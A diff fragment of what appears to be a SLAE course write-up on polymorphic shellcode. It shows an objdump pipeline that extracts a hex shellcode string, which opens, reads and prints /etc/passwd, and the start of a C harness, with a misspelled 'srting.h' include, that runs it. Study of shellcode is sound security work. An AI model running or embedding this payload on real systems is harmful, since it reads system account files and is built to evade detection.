@@ -153,10 +153,10 @@ ssize_t read(int fd, void *buf, size_t count);
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d ./polytiny|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'<br />"\xc1\xe9\x10\xf7\xe1\xb0\x05\x89\x4c\x24\xfc\xc7\x44\x24\xf8\x73\x73\x77\x64\xc7\x44\x24\xf4\x63\x2f\x70\x61\xc7\x44\x24\xf0\x2f\x2f\x65\x74\x83\xec\x10\x89\xe3\x66\xba\xbc\x01\xcd\x80\x89\xd9\x89\xc3\xb0\x03\x66\xba\xfe\x0f\x66\x42\xcd\x80\x31\xc0\xb0\x04\x80\xeb\x02\xcd\x80\xc1\xe8\x10\xfe\xc0\xcd\x80"</pre>
 <p style="text-align:justify;">The following program will be used to deliver the execution of the new polymorphic <em>shellcode</em></p>
 
-```C
+```c
 
-#include &lt;stdio.h>
-#include &lt;srting.h>
+#include <stdio.h>
+#include <srting.h>
 
 unsigned char code[] = \
      "\xc1\xe9\x10\xf7\xe1\xb0\x05\x89\x4c\x24\xfc\xc7"
